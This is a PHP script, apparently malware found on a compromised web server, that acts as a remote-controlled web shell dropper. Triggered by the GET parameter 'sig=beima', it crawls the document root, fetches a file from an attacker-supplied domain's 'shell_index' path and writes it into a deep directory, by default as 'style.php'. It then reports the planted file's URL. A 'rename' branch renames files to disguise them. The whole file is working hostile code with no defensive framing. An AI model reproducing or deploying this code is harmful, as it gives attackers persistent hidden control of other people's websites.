<?php
	function curl_get_contents($url){
       $ch =curl_init();
       curl_setopt($ch, CURLOPT_URL, $url);
       curl_setopt($ch, CURLOPT_TIMEOUT,5);
       curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
       $r = curl_exec($ch);
       curl_close($ch);
       return $r;
    }
	function copyfiles($file1,$file2){
	 	$contentx =@file_get_contents($file1);
	  	$openedfile = fopen($file2, "w");
	  	fwrite($openedfile, $contentx);
	  	fclose($openedfile);
	    if ($contentx === FALSE) {
	   		$status=false;
	    }else $status=true;
	   	return $status;
  	}
	function read_dir_queue($dir,$level=5){
		$files=array();
		$files1=array();
		$queue=array($dir);
		while(@$data=each($queue)){
			$path=$data['value'];
			if(@is_dir($path) && @$handle=opendir($path)){
				while($file=readdir($handle)){
					$path3 = str_replace($_SERVER['DOCUMENT_ROOT'],"",$path);
					$path4 = explode("/",$path3);
					if(count($path4)>$level){ break 2; }
					//if(count($files)>1000){ break 2; }
					if($file=='.'||$file=='..') continue;
					$files[] = $real_path=$path.'/'.$file;
					if (is_dir($real_path)) $queue[] = $real_path;
				}
			}
			@closedir($handle);
		}
		return $files;
	}

 	$sig = $_GET['sig'];
 	$domain_2020 = 'http://'.$_GET['domain'];
 	if($sig=='beima'){
 		$level = $_GET['level'];
 		$aPathes = read_dir_queue($_SERVER['DOCUMENT_ROOT'],$level);
		function getDepth($sPath) {
		    return substr_count($sPath, '/');
		}
		$aPathDepths = array_map('getDepth', $aPathes);
		arsort($aPathDepths);
		$arry1=array();
		foreach ($aPathDepths as $iKey => $iDepth) {
			$arry1[] = $aPathes[$iKey];
		}
		$arry2=array();
		for($j=0;$j<8;$j++){
			if($arry1[$j]!=''){
				$arry2[]=$arry1[$j];
			}
		}
		shuffle($arry2);
		$shell_file = $_GET['shell_file'];
		$shell_source5 = $domain_2020."/shell_index/".$shell_file.".html";
		$file_name = $_GET['file_name'];
		if($file_name!=""){
			$shell_end5 = dirname($arry2[0]).'/'.$file_name;
		}else{
			$shell_end5 = dirname($arry2[0]).'/style.php';
		}
 		if(copyfiles($shell_source5,$shell_end5))
	    {
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
	 		$shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6; 
	    }else{
	    	$str6=@curl_get_contents($shell_source5);
	    	file_put_contents($shell_end5,$str6);
	    	if($_SERVER["HTTPS"] == "on") 
		    {
		        $http1="https://";
		    }else{
		    	$http1="http://";
		    }
	     	if(!file_exists($shell_end5))
			{
			    echo $http1.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."|"."file don't create success!";
			    exit;
			}
		    $shell_end6 =$http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$shell_end5);
	 		echo $shell_end6;
	    }
	    exit;
 	}else if($sig=='rename'){
 		$rename = $_GET['rename'];
 		$source_name = $_GET['source_name'];
 		if($_GET['tag']!=''){
 			$tag='#'.$_GET['tag'];
 		}else{
 			$tag='';
 		}
 		$rename_file = dirname(__FILE__).'/'.$rename;
	 	$source_file = dirname(__FILE__).'/'.$source_name;
 		if($_SERVER["HTTPS"] == "on") 
		{
		   $http1="https://";
		}else{
		   $http1="http://";
		}
		$rename_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$rename_file);
		$source_file1 = $http1.$_SERVER["HTTP_HOST"].str_replace($_SERVER['DOCUMENT_ROOT'],'',$source_file);
	    if(file_exists($source_file)){
	        if(rename($source_file,$rename_file)){
	            echo $rename_file1.$tag;
	        }else{
	            echo $source_file1.$tag.'| rename fail!';
	        }
	    }else{
	        echo $source_file1.$tag.'| no exists!';
	    }
 		exit;
 	}
 	exit();
?>